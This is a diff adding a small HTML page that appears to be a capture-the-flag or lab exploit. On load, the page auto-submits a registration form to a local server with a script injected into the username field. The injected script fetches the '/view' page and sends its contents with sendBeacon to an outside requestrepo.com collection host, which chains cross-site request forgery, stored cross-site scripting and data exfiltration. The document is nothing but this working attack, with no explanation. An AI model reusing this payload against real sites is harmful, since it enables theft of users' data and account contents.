@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <form action="http://localhost:8080/register" method="POST">
+        <input type="text" name="username" placeholder="username" id="payload">
+        <br><br>
+        <input type="text" name="nickname" placeholder="nickname" value="bla">
+        <br><br>
+        <input type="text" name="decade" placeholder="decade" value="bla">
+        <br><br>
+        <input type="password" name="password" placeholder="password" value="bla">
+        <br><br>
+        <input type="submit" value="Submit">
+    </form>
+
+    <script>
+        value = "\x3Cscript>var x = new XMLHttpRequest;x.open('GET','/view'); x.onload = function (){navigator.sendBeacon('http://fiph4zll.requestrepo.com', this.responseText)};x.send();\x3C/script>";
+        document.getElementById("payload").setAttribute('value', value);
+        document.forms[0].submit();
+    </script>
+</body>
+
+</html>
